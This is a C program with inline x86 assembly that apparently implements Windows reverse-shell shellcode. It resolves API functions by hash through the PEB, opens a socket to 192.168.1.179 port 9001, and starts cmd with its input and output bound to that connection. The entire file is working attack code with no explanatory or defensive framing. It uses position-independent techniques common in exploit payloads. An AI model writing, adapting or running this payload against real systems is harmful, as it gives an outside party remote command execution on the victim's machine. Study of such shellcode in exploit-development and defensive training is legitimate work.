#include <stdio.h>
#include <Windows.h>

#define DEBUG 0

int main(void)
{

	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);

#if DEBUG
	getchar();
#endif

	__asm
	{
		start:
			mov ebp, esp
			sub sp, 0x610

		find_kernel32:
			xor ecx, ecx
			mov esi, dword ptr fs:[ecx + 0x30] // &PEB
			mov esi, dword ptr[esi + 0xc] // PEB->Ldr
			mov esi, dword ptr[esi + 0x1c] // Ldr.InInitOrder

		parse_next_module:
			mov ebx, dword ptr[esi + 0x8] // InInitOrder[x].DllBase
			mov edi, dword ptr[esi + 0x20] // InInitOrder[x].BaseDllName
			mov esi, [esi] // InInitOrder[x].Flink
			cmp word ptr[edi + 12 * 2], cx // check if 25th dword is 0
			jne parse_next_module

		find_function_jmp:
			jmp callback

		find_function_ret:
			pop esi // return address
			mov dword ptr[ebp + 0x4], esi // store ret addr
			jmp resolve_k32_sym

		callback:
			call find_function_ret
				
		find_function:
			add esp, 0x4
			pop eax
			push 0xffffffff
			add esp, eax

		find_function_loop2 :
			mov eax, dword ptr[ebx + 0x3c] // PE header
			mov edi, dword ptr[ebx + eax + 0x78] // Export Dir Table relative address
			add edi, ebx // EDT address
			mov ecx, dword ptr[edi + 0x18] // NumberOfNames
			mov eax, dword ptr[edi + 0x20] // AddressOfNames relative address
			add eax, ebx // AddressOfNames address
			mov dword ptr[ebp - 0x4], eax // Store it

		find_function_loop :
			dec ecx
			mov eax, dword ptr[ebp - 0x4]
			mov esi, dword ptr[eax + ecx * 4] // Index
			add esi, ebx //get actual address of function name

		compute_hash :
			xor eax, eax
			cdq

		compute_hash_repeat :
			ror edx, 0xd // rotate right by 0xd bits
			add edx, eax
			lodsb
			test al, al
			jnz compute_hash_repeat

		find_function_compare :
			cmp edx, dword ptr[esp - 4] // compare pre pushed hash and calculated hash
			jnz find_function_loop
			mov edx, dword ptr[edi + 0x24] // AddressOfNameOrdinals relative address
			add edx, ebx // actual addr
			mov cx, word ptr[edx + 2 * ecx] // get ordinal from same index
			mov edx, dword ptr[edi + 0x1c] // AddressOfFunctions relative address
			add edx, ebx
			mov eax, dword ptr[edx + 4 * ecx] // move relative address of function into eax
			add eax, ebx
			push eax
			cmp dword ptr[esp - 4], 0xffffffff
			jnz find_function_loop2

		find_function_finish :
			sub esp, 0x8
			ret

		resolve_k32_sym:
			push 0xec0e4e8e // LoadLibraryA
			push 0x16b3fe72 // CreateProcessA
			push 0xc
			call dword ptr[ebp + 0x4]

		load_ws2_32:
			xor eax, eax
			mov ax, 0x6c6c // ll
			push eax
			push 0x642e3233 // d.23
			push 0x5f327377 // _2sw
			push esp // ptr to "ws2_32.dll" string
			call dword ptr[esp + 0x18]

		resolve_ws2_sym:
			mov ebx, eax // ws2_32.dll base addr
			push 0x60aaf9ec // connect
			push 0xadf509d9 // WSASocketA
			push 0xc
			call dword ptr[ebp + 0x4]

		call_wsasocketa:
			xor eax, eax
			push eax
			push eax
			push eax
			push 0x6
			push 0x1
			push 0x2
 			call dword ptr[esp + 0x1c]

		call_connect:
			mov ebx, eax
			xor edi, edi
			xor eax, eax
			push edi
			push edi
			push 0xb301a8c0 // sin_addr (192.168.1.179)
			mov di, 0x2923 // sin_port (9001)
			shl edi, 0x10
			add di, 0x2 // AF_INET
			push edi
			mov edi, esp
			push 0x10
			push edi // name
			push ebx // SOCKFD
			call dword ptr[esp + 0x24]
			
		create_startupinfoa:
			xor ecx, ecx
			mov esi, esp
			std
			mov cl, 0x23
			rep stosd
			cld
			push ebx
			push ebx
			push ebx
			push eax
			push eax
			inc ch
			push ecx
			dec ch
			sub esp, 0x28
			mov al, 0x44
			push eax
			mov edi, esp

		create_cmd_str:
			mov eax, 0xff9b929d;
			neg eax;
			push eax;
			mov ebx, esp

		call_createprocessa :
			mov eax, esp // Move ESP to EAX
			add eax, 0xfffffc70
			push eax // Push lpProcessInformation
			push edi // Push lpStartupInfo
			sub esp, 0xc
			push 0x1
			push ecx
			push ecx
			push ebx
			push ecx
			lea edx, dword ptr[esp + 0x54]
			#if DEBUG
				int 3
			#endif
			call dword ptr[edx + 0x48]
	}

	return 0;
}